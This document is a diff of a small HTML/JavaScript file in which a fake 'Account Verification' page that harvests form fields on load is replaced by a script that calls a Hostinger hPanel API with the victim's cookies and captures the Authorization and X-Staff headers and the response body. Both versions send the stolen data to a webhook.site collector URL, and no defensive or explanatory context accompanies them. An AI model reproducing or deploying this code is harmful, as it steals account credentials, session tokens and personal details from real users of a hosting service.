@@ -1,51 +1,30 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Account Verification</title>
-</head>
-<body>
-    <h2>Verifying Your Account...</h2>
-    <p>Please wait while we verify your account information.</p>
-    <div id="status"></div>
+<script>
+const targetUrl = 'https://hpanel.hostinger.com/api/auth/api/external/v1/invitations?gaid=GA1.1.1770165202.1756321190';
+const webhookUrl = 'https://webhook.site/a28a04ba-9bc8-4548-a92c-9b2b289f8a51';
 
-    <script>
-        // Function to extract form values
-        function extractFormValues() {
-            const formData = {
-                salutation: document.querySelector('select[name="salutation"]')?.value || '',
-                firstName: document.querySelector('input[name="firstName"]')?.value || '',
-                lastName: document.querySelector('input[name="lastName"]')?.value || '',
-                email: document.querySelector('input[name="email"]')?.value || ''
-            };
-            return formData;
-        }
+fetch(targetUrl, {
+    method: 'GET',
+    credentials: 'include'
+})
+.then(async response => {
+    const data = await response.json();
+    const headers = {
+        authorization: response.headers.get('Authorization'),
+        xStaff: response.headers.get('X-Staff')
+    };
+    // Combine headers and body
+    const payload = {
+        headers,
+        body: data
+    };
 
-        // Function to send data to webhook
-        function sendDataToWebhook(data) {
-            // Replace with your actual webhook URL
-            const webhookUrl = 'https://webhook.site/a28a04ba-9bc8-4548-a92c-9b2b289f8a51':
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                document.getElementById('status').textContent = 'Verification successful!';
-                document.getElementById('status').style.color = 'green';
-            })
-            .catch(error => {
-                document.getElementById('status').textContent = 'Verification failed. Please try again later.';
-                document.getElementById('status').style.color = 'red';
-            });
-        }
-
-        // Automatically extract and send data when page loads
-        window.onload = function() {
-            const formData = extractFormValues();
-            sendDataToWebhook(formData);
-        };
-    </script>
-</body>
-</html>
+    // Send to webhook
+    return fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
+})
+.then(res => console.log('Webhook response status:', res.status))
+.catch(err => console.error('Error:', err));
+</script>
